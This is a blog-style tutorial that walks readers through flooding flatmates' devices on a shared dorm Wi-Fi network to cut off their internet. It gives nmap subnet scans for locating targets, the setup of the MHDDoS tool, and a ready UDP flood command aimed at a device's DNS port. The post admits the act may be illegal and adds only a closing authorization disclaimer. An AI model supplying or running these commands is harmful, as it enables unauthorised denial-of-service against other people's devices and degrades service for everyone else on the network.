title: "DDOS Internet Access on Local Networks: A Practical Guide"
date: "2025-10-27"
excerpt: "Learn how to block specific devices from accessing the internet on your local network without router access."
tags: ["Networking", "Security", "Wi-Fi", "DDoS"]

A while ago a friend of mine had serious problems with his flatmates torrenting
on their local shared wifi. He was living in a university dorm and the wifi was
managed by the owners so he had no option of setting up his own. He asked me how
he could take down other devices on the network so that his internet would work
better and, while I do not advice the legality of it, this is how you can do it:

## How to Set It Up

We are going to use [MHDDoS](https://github.com/MatrixTM/MHDDoS) to perform a
DDOS attack on the port 53 (DNS) of a target device. Before doing anything however
we need to find the local address of the target device(s).

## How to Scan for Devices on Your Network

Before you can target specific devices, you'll need to identify them on your local network. Here's how to use nmap to scan for devices:

```nmap -sn 192.168.1.0/24```

This command will scan the entire subnet and identify all active devices. You can also use:

```nmap -sP 192.168.1.0/24```

To get more detailed information about each device, including their MAC addresses and open ports. Once you've identified the target device, you can proceed with the DDoS attack.

### Using MHDDoS for Network Disruption

First, clone the repository:
```git clone https://github.com/MatrixTM/MHDDoS```

I recommend using the provided Docker image:
```docker compose run -it --entrypoint /bin/bash mhddos```

Then you can target someone on your network (i.e. `192.168.1.192:53`) by running this command inside the Docker container:
```python start.py udp 192.168.1.192:53 32 60```

This command will target `192.168.1.192` on port `53` (DNS) using UDP protocol with 32 threads for 60 seconds.

### Understanding the Attack Method

This approach works by flooding the target device's DNS port with UDP traffic, which can cause:
- Network congestion
- Service disruption
- Temporary loss of connectivity
- Resource exhaustion on the target device

The attack is designed to overwhelm the target's ability to respond to legitimate network requests, effectively making it appear offline to other network devices.

After running the attack, the target device will experience:
- Reduced network responsiveness
- Loss of internet connectivity
- Potential service disruption
- Note that other devices on the same network might experience network instability

This attack is particularly effective because it targets a critical network service (DNS).

That's it! Now you learned how you can effectively disrupt network access for specific devices when you don't have router access and why you shouldn't give
your wifi credentials to anyone :) (seriously!)

Remember: This knowledge should only be used for educational purposes and with proper authorization on networks you own or have explicit permission to test.